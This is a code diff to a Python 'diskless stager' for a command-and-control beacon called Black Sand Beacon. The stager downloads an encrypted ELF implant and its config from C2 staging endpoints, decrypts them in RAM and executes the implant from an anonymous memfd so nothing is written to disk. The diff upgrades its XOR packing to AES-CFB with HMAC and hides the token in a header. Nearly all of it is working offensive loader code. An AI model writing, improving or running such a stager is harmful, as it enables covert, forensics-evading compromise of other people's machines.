@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 """Black Sand Beacon diskless stager.
 
-Fetches the token-packed beacon ELF and config.json from the C2 staging
-endpoints, decodes them in RAM, and executes the beacon from an
-anonymous memfd. Nothing is ever written to disk.
+Fetches encrypted beacon ELF and config.json from C2 staging endpoints,
+decrypts them in RAM, and executes the beacon from an anonymous memfd.
+Nothing is ever written to disk.
 
-Packing is three XOR layers whose keys are derived from the staging
-token via HKDF-SHA256 (salt "blacksandbeacon-stage-v1") — byte-identical
-to the server's derivation in c2/server.py. No key material on the wire.
+Payloads are protected with AES-256-CFB + HMAC-SHA256 using keys derived
+from the staging token via HKDF-SHA256 (salt "blacksandbeacon-stage-v2"),
+matching c2/server.py. Token is sent in Authorization header (not URL).
 
 Environment:
     BSB_STAGE_URL          base C2 URL (e.g. https://c2.example:7070)
@@ -30,12 +30,16 @@ import sys
 import urllib.error
 import urllib.request
 
-HKDF_SALT = b"blacksandbeacon-stage-v1"
-HKDF_INFOS = (b"stage-l1", b"stage-l2", b"stage-l3")
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+
+HKDF_SALT = b"blacksandbeacon-stage-v2"
+HKDF_INFO_ENC = b"stage-enc"
+HKDF_INFO_HMAC = b"stage-hmac"
 
 
 def hkdf_sha256(ikm, salt, info, length=32):
-    """RFC 5869 HKDF extract+expand (stdlib only, mirrors c2/server.py)."""
+    """RFC 5869 HKDF extract+expand (mirrors c2/server.py)."""
     prk = hmac.new(salt, ikm, hashlib.sha256).digest()
     out, t, counter = b"", b"", 1
     while len(out) < length:
@@ -46,8 +50,12 @@ def hkdf_sha256(ikm, salt, info, length=32):
 
 
 def _fetch_and_decode(url, token, path, tls_ctx):
+    req = urllib.request.Request(
+        url + path,
+        headers={"Authorization": f"Bearer {token}"},
+    )
     try:
-        rq = urllib.request.urlopen(url + path + token, context=tls_ctx)
+        rq = urllib.request.urlopen(req, context=tls_ctx)
     except urllib.error.HTTPError as e:
         if e.code in (403, 404):
             sys.exit(
@@ -56,12 +64,21 @@ def _fetch_and_decode(url, token, path, tls_ctx):
                 "C2 config.json (the one-liner must come from the running server)."
             )
         raise
-    blob = base64.b64decode(rq.read().strip())
+    raw = base64.b64decode(rq.read().strip())
+    if len(raw) < 16 + 32:
+        sys.exit("stage: response too short")
+    tag = raw[-32:]
+    body = raw[:-32]
     ikm = token.encode("utf-8")
-    for info in reversed(HKDF_INFOS):
-        key = hkdf_sha256(ikm, HKDF_SALT, info)
-        blob = bytes(v ^ key[i % len(key)] for i, v in enumerate(blob))
-    return blob
+    enc_key = hkdf_sha256(ikm, HKDF_SALT, HKDF_INFO_ENC)
+    mac_key = hkdf_sha256(ikm, HKDF_SALT, HKDF_INFO_HMAC)
+    expected = hmac.new(mac_key, body, hashlib.sha256).digest()
+    if not hmac.compare_digest(tag, expected):
+        sys.exit("stage: authentication failed (bad token or tampered payload)")
+    iv, ciphertext = body[:16], body[16:]
+    cipher = Cipher(algorithms.AES(enc_key), modes.CFB(iv), backend=default_backend())
+    decryptor = cipher.decryptor()
+    return decryptor.update(ciphertext) + decryptor.finalize()
 
 
 def main():
@@ -74,9 +91,9 @@ def main():
         else None
     )
 
-    elf = _fetch_and_decode(url, token, "/stage/beacon/", tls_ctx)
+    elf = _fetch_and_decode(url, token, "/stage/beacon", tls_ctx)
     assert elf[:4] == b"\x7fELF", "stage: decoded payload is not an ELF"
-    conf = _fetch_and_decode(url, token, "/stage/config/", tls_ctx)
+    conf = _fetch_and_decode(url, token, "/stage/config", tls_ctx)
     json.loads(conf.decode())  # sanity: must be valid JSON
 
     # MFD_CLOEXEC not set on the config fd: it must survive execve so the
